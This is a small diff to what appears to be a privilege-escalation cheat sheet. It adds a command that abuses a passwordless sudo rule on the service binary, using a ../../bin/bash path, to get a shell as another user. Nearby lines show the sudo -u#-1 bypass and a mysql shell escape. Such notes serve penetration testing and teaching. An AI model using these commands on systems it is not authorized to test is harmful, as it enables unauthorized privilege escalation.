@@ -590,6 +590,7 @@ sudo -u#-1 /bin/bash
 ```
 ```bash
 sudo -l
+sudo -u steven /usr/sbin/service ../../bin/bash	#(steven) NOPASSWD: /usr/sbin/service
 ```
 ```bash
 sudo mysql -e '\! /bin/sh'
